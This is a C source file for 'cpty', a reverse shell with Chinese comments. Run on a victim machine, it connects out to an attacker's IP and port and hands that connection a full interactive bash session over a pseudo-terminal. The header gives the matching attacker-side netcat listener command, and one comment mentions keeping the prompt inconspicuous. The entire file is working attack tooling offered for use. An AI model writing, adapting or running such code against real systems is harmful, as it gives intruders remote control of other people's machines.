/*
 * cpty - A "Perfect" Reverse PTY Shell in C
 * * Dependencies: libutil (for forkpty)
 * Compile: gcc -o cpty cpty.c -lutil
 * * Usage (Victim): ./cpty <IP> <PORT>
 * Usage (Attacker): stty raw -echo; nc -lvp <PORT>; stty sane
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <poll.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <pty.h>  // 需要链接 -lutil
#include <termios.h>

#define BUF_SIZE 2048

// 设置 PTY 的初始大小，默认为 80x24
// 在实战中，这里其实很难自动同步，通常需要在 shell 里手动 stty rows X cols Y
struct winsize ws = {
    .ws_row = 24,
    .ws_col = 80,
    .ws_xpixel = 0,
    .ws_ypixel = 0
};

int connect_to_attacker(const char *ip, int port) {
    int sockfd;
    struct sockaddr_in addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) return -1;

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return -1;
    }
    return sockfd;
}

void proxy_traffic(int socket_fd, int pty_fd) {
    struct pollfd fds[2];
    char buf[BUF_SIZE];
    int nread, nwritten;

    // fds[0] 监听来自网络的数据 (Attacker -> Victim)
    fds[0].fd = socket_fd;
    fds[0].events = POLLIN;

    // fds[1] 监听来自 PTY 的数据 (Victim Shell -> Attacker)
    fds[1].fd = pty_fd;
    fds[1].events = POLLIN;

    while (1) {
        // -1 表示无限超时等待，直到有事件发生
        if (poll(fds, 2, -1) < 0) {
            if (errno == EINTR) continue; // 被信号打断，继续
            break;
        }

        // 1. 处理网络输入：攻击者发送命令 -> 写入 PTY Master
        if (fds[0].revents & (POLLIN | POLLERR | POLLHUP)) {
            nread = read(socket_fd, buf, sizeof(buf));
            if (nread <= 0) break; // 连接断开

            // 写入 PTY (模拟键盘输入)
            // 注意：这里简单的 write 可能会阻塞，完美实现需要 non-blocking buffer，
            // 但为了代码精简，这里假设 buffer 足够快。
            write(pty_fd, buf, nread);
        }

        // 2. 处理 PTY 输出：Shell 回显 -> 写入 Socket
        if (fds[1].revents & (POLLIN | POLLERR | POLLHUP)) {
            nread = read(pty_fd, buf, sizeof(buf));
            if (nread <= 0) break; // Shell 退出

            // 写入 Socket (发回给攻击者)
            write(socket_fd, buf, nread);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <IP> <PORT>\n", argv[0]);
        exit(1);
    }

    // 1. 建立 TCP 连接
    int socket_fd = connect_to_attacker(argv[1], atoi(argv[2]));
    if (socket_fd < 0) {
        perror("Connect failed");
        exit(1);
    }

    int master_fd;
    pid_t pid;

    // 2. 创建 PTY 并 Fork
    // forkpty 做了三件事: openpty(), fork(), login_tty()
    pid = forkpty(&master_fd, NULL, NULL, &ws);

    if (pid < 0) {
        perror("Forkpty failed");
        close(socket_fd);
        exit(1);
    }

    if (pid == 0) {
        // --- 子进程 (Victim Shell) ---
        
        // 关键：设置 TERM，否则 top/vim 可能会报错或不显示颜色
        setenv("TERM", "xterm-256color", 1);
        
        // 也可以设置 PS1 让提示符好看点，或者保持默认隐蔽
        // setenv("PS1", "\\u@\\h:\\w\\$ ", 1);

        // 启动 Bash，-i 强制交互模式 (虽然 PTY 已经是交互了，加个保险)
        char *args[] = { "/bin/bash", "-i", NULL };
        
        // 替换当前进程
        execvp(args[0], args);
        
        // 如果执行失败
        exit(1);
    }

    // --- 父进程 (Proxy) ---
    // 进入数据转发循环
    proxy_traffic(socket_fd, master_fd);

    // 清理工作
    close(socket_fd);
    close(master_fd);
    
    // 等待子进程退出，防止僵尸进程
    waitpid(pid, NULL, 0);

    return 0;
}